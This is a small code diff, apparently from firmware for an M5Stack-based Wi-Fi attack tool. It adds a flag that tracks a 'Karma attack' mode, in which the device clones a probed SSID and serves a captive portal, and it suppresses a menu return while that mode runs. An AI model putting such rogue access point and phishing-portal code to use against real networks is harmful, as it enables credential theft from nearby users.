@@ -109,7 +109,7 @@
   AppState currentStateKarma = StartScanKarma;
   
   bool isProbeSniffingMode = false;
-  
+  bool isProbeKarmaAttackMode = false;
   // Probe Sniffing end
   
   
@@ -829,7 +829,9 @@ void createCaptivePortal() {
        Serial.println("-------------------");
        Serial.println("Portal " + ssid + " Deployed with " + selectedPortalFile.substring(7) + " Portal !");
        Serial.println("-------------------");
-      waitAndReturnToMenu("     Portal\n        " + ssid + "\n        Deployed");
+       if (!isProbeKarmaAttackMode){
+          waitAndReturnToMenu("     Portal\n        " + ssid + "\n        Deployed");
+       }
   }
   
   
@@ -1852,12 +1854,13 @@ void handleChangePassword() {
   
   void startAPWithSSIDKarma(const char* ssid) {
     clonedSSID = String(ssid);
+    isProbeKarmaAttackMode = true;
     createCaptivePortal();
     
     Serial.println("-------------------");
     Serial.println("Karma Attack started for : " + String(ssid));
     Serial.println("-------------------");
-  
+   
     M5.Display.clear();
     unsigned long startTime = millis();
     unsigned long currentTime;
@@ -1930,6 +1933,7 @@ void handleChangePassword() {
     }
     lastIndex = -1;
     inMenu = true;  
+    isProbeKarmaAttackMode = false;
     currentStateKarma = StartScanKarma;
     memset(ssidsKarma, 0, sizeof(ssidsKarma)); 
     ssid_count_Karma = 0;
